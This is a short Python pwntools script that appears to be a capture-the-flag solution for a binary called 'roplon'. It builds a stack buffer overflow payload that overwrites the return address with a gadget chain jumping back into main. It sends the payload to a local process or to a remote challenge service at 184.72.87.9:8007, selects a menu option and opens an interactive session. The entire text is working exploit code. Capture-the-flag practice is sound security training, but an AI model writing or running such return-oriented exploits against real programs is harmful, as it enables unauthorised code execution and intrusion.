from pwn import *

local = True
elf = ELF('./roplon')

if local:
    io = elf.process()
else:
    io = remote("184.72.87.9", 8007)

#pause()

pld = b""
pld += b"1"
pld += b"A"*23
pld += p64(0x00000000004011c5)
pld += p64(0x000000000040101a) #ret gadget
pld += p64(elf.sym['main'] + 84) # do_things

io.sendlineafter(b"2: shasum flag.txt\n", pld)
io.sendlineafter(b"2: shasum flag.txt\n", b"3")
io.interactive()

